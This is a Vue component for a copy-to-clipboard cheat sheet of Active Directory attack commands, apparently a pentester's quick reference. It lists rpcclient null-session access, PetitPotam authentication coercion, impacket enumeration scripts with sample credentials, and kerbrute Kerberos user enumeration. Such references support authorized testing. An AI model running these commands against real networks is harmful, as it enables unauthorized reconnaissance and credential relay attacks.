<template>
  <div class="demo-collapse">
    <el-collapse v-model="activeNames" @change="handleChange" accordion>
      <el-collapse-item
        v-for="(command, key_c, index) in commands"
        :key="index"
        :name="index + 1"
      >
        <template #title>
          <span class="custom-title">{{ key_c }}</span>
        </template>
        <div
          v-for="(commandContent, commandName) in command"
          :key="commandName"
          class="input-container"
        >
          <label :for="key">{{ commandName }}:</label>
          <el-input
            :id="key"
            v-model="command[commandName]"
            readonly
            type="textarea"
            :autosize="{ minRows: 1, maxRows: 5 }"
          >
            <template #append>
              <el-button @click="copyToClipboard(command[commandName])"
                >复制</el-button
              >
            </template>
          </el-input>
        </div>
      </el-collapse-item>
    </el-collapse>
  </div>
</template>

<script>
import { reactive } from "vue";
export default {
  setup() {
    const commands = reactive({
      "RPC (135,139) ": {
        rpcclient: "rpcclient -U '' -N XXX",
        PetitPotam:
          "python3 PetitPotam.py -d test.local -u john -p password123 10.10.10.2 10.10.10.1",
        "impacket-services":
          "python3 services.py test.local/john:password123@XXX list",
        "impacket-samrdump":
          "python3 samrdump.py test.local/john:password123@XXX",
        "impacket-rpcdump":
          "python3 rpcdump.py test.local/john:password123@XXX",
        "impacket-lookupsid":
          "python3 lookupsid.py test.local/john:password123@XXX",
      },
      "Kerberos (88)": {
        用户枚举:
          "kerbrute userenum --domain domain-test --dc XXX /usr/share/seclists/Usernames/mssql-usernames-nansh0u-guardicore.txt",
      },
    });

    return {
      commands,
    };
  },
  methods: {
    copyToClipboard(text) {
      navigator.clipboard.writeText(text).then(
        () => {},
        (err) => {
          console.error("无法复制文本: ", err);
        }
      );
    },
  },
};
</script>
